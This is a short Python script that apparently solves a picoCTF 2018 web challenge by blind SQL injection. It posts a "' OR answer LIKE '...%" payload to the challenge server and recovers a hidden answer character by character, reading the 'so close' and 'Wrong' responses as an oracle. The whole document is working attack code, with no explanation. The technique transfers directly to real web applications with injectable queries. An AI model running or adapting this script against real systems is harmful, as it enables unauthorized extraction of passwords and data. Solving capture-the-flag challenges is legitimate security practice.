import requests

import string

url="http://2018shell1.picoctf.com:36052/answer2.php"
alphabet=string.printable.replace('%','').replace("'",'')
password=''

stop = False
while not stop:
    for c in alphabet:
        params = {'answer': "' OR answer LIKE '"+password+c+"%", 'debug': '1'}

        r = requests.post(url, data=params)

        #print(r.text)

        if "so close" in r.text:
            password += c
            print("letter found! "+password)
            break
        elif "Wrong" not in r.text:
            stop = True
            print(r.text)
            break

print(password)
